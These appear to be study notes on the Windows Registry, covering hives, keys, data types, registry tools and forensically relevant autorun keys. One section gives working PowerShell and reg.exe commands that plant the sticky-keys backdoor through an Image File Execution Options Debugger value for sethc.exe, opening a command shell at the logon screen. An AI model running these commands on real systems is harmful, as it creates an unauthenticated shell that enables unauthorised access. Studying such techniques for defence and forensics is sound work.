Windows Registry
----------------
What is it?
	- Hierachical database of critical system configuration
	- Registry is the configuration and control mechanism for the Windows OS
	- Contains both system-wide and per-user settings
What is it's role?
	- During Initial Boot Process (pre-kernel)
		- List of boot device drivers to load before kernel
	- During kernel boot process
		- Loads device drivers and system element configuration
	- During Logon
		- Reads per-user preferences and settings
	- During application startup and execution
		- Licensing data, installed component, software settings/configuration
	- Random reads and writes during application use

Registry Hives:
- A Registry Hive is a group of keys, subkeys, and values in the registry that has a set of supporting files that contain backups of its data
- Five Types of Hives
	- HKCU - Current User - personal account settings
	- HKU - Users, all accounts on machine
	- HKCR - Classes Root, file associations, backward compatibility, and file extension info
	- HKLM - Local Machine, system related information, critical boot/kernel functions, hardware
	- HKCC - Current Configuration - current hardware profile, info that is gathered at runtime


***ONLY HKCU and HKLM are available via remote connections***

Registry contains KEYS and VALUES:
- KEYS contain other keys (sub-keys) and/or collection of property/value pairs. Keys are a container object, like folder
- VALUES store data, and are non-container object, much like a file

Common Data Types
REG_SZ
REG_LINK
REG_BINARY
REG_MULTI_SZ
REG_DWORD
REG_QWORD

Registry Tools
--------------
- Regedit.exe - GUI based registry tool
- REG.exe - command line tool
- psexec -s -i regedit
- psexec -s -i powershell
- WMIC class stdregprov CALL <MethodName>
- Get-Child Item HKLM

Changes to the registry may require a restart to take effect.

Instructions for creating a malicious shell at logon via Powershell:
-new-item -path 'HKLM:\software\microsoft\windows nt\currentversion\image file execution options\sethc.exe'
new-itemproperty -path 'hklm:\software\microsoft\windows nt\currentversion\image file execution options\sethc.exe\' -Name Debugger -Type string -Value "C:\Windows\System32\cmd.exe"
- Log out, and now if you hit sticky keys (hit shift 5-10 times quickly), a CMD Shell pops up

Instructions via CLI:
reg add "HKLM\SOFTWARE\Microsoft\windows nt\currentversion\image file execution options\sethc.exe" /v Debugger /t reg_sz /d "C:\Windows\System32\cmd.exe"

Forensically-relevant Registry Locations
---------------------------------------
HKLM\RUN - runs on every reboot
HKLM\RUNONCE - runs on the next reboot
HKCU\RUN or HKCU\RUNONCE - runs on that user's logon
